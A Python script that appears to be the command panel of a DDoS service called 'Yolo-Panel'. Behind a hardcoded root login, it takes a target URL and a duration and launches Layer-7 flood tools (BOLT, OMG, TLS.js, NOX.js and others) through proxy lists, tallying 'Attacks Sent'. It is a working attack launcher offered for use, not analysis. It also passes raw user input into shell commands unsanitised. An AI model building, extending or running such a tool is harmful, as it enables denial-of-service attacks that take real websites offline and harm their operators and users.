import os
import sys
import time
import getpass

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def main():
    clear_screen()
    while True:
        sys.stdout.write(f"\x1b]2;Yolo-Panel :: Online Users: [1] :: Attacks Sent: [1/10]\x07")
        sin = input("YOLO@PANEL:~# ")
        sinput = sin.split(" ")[0]

        if sinput in ["clear", "cls", "CLS"]:
            clear_screen()
            main()

        elif sinput in ["help", "HELP", ".help", ".HELP", "menu", ".menu", "MENU", ".MENU"]:
            help()

        elif sinput in ["BOLT", "bolt"]:
            try:
                url, time = sin.split()[1:3]
                os.system(f'cd L7 && ./BOLT {url} {time} 64 10')
                clear_screen()
            except (ValueError, IndexError):
                main()

        elif sinput in ["OMG", "omg"]:
            try:
                url, time = sin.split()[1:3]
                os.system(f'cd L7 && ./OMG GET {url} proxy.txt {time} 64 10')
                clear_screen()
            except (ValueError, IndexError):
                main()

        elif sinput in ["YOLO", "yolo"]:
            try:
                url, time = sin.split()[1:3]
                os.system(f'cd L7 && node YOLO.js {url} {time} 64 10 proxy.txt')
                clear_screen()
            except (ValueError, IndexError):
                main()

        elif sinput in ["TLS", "tls"]:
            try:
                url, time = sin.split()[1:3]
                os.system(f'cd L7 && node TLS.js GET {url} proxy.txt {time} 64 10')
                clear_screen()
            except (ValueError, IndexError):
                main()

        elif sinput in ["NOX", "nox"]:
            try:
                url, time = sin.split()[1:3]
                os.system(f'cd L7 && node NOX.js {url} {time} 64 10 proxy.txt')
                clear_screen()
            except (ValueError, IndexError):
                main()

        elif sinput in ["BOT", "bot"]:
            try:
                url, time = sin.split()[1:3]
                os.system(f'cd L7 && node BOT.js {url} {time} 64 10 proxy.txt')
                clear_screen()
            except (ValueError, IndexError):
                main()

        elif sinput == "404":
            try:
                url, time = sin.split()[1:3]
                os.system(f'cd L7 && node 404.js {url} {time} 64 10 proxy.txt')
                clear_screen()
            except (ValueError, IndexError):
                main()

def login():
    sys.stdout.write(f"\x1b]2;Yolo-Panel :: Online Users: [1] :: Attacks Sent: [1/10]\x07")
    clear_screen()

    user = "root"
    passwd = "1907"
    
    username = input("USERNAME: ")
    password = getpass.getpass(prompt="PASSWORD: ")

    if username != user or password != passwd:
        sys.exit(1)
    else:
        print("Successfully logged in.")
        time.sleep(1)
        main()

login()